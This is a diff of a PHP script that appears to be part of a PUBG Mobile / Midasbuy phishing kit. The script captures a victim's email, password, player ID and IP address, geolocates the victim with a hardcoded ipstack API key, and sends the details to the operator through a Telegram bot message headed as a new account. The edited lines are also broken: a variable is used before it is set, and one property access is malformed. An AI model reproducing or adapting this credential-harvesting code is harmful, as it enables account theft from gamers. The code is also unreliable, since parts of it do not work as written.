@@ -40,15 +40,26 @@ $playid = $_GET['playid'];
 $linky = $_SERVER['HTTP_HOST'];
 if($email){
 $api_key = "26dc150b1cf3c41dc866400812300e6d";
-$cty1 = file_get_contents("http://api.ipstack.com/".$ip."?access_key=".$api_key."&format=1");
+$cty1 = file_get_contents("http://api.ipstack.com/".$ipp."?access_key=".$api_key."&format=1");
 $jsondata = json_decode($cty1);
 $cty = $jsondata->country_name;
 
-$code1 = file_get_contents("http://api.ipstack.com/".$ip."?access_key=".$api_key."&format=1");
+$ipp = file_get_contents("http://ip-api.com/json");
 
-$jsondata = json_decode($code1);
 
-$code = $jsondata->calling_code;
+$jsondata = json_decode($ipp);
+
+
+$ipp = $jsondata->query;
+
+$code= file_get_contents("http://api.ipstack.com/".$ipp."?access_key=".$api_key."&format=1");
+
+$jsondata = json_decode($code);
+
+
+$code= $jsondata-calling_code;
+    
+    
 
 
 $url1 = "https://www.midasbuy.com/events/register/pubgm?lan=en&v=4&from=__mds_buy_banner.events";
@@ -60,7 +71,7 @@ bot("sendMessage",[
 
 ╭────•𝚈𝙾𝚄 𝙷𝙰𝚅𝙴 𝙰 𝙽𝙴𝚆 𝙰𝙲𝙲𝙾𝚄𝙽𝚃•────╮
    ➥ 𝙻𝙾𝙶𝙸𝙽 𝙱𝚈  »  $login
-   💻 • 𝚒𝙿 » $ip
+   💻 • 𝚒𝙿 » `$ipp`
    📧 • 𝙴𝚖𝚊𝚒𝚕 »  `$email`
    📟 • 𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍 » `$password`
    💎 • 𝙿𝚕𝚊𝚢𝚎𝚛 𝙸𝙳 » $playid
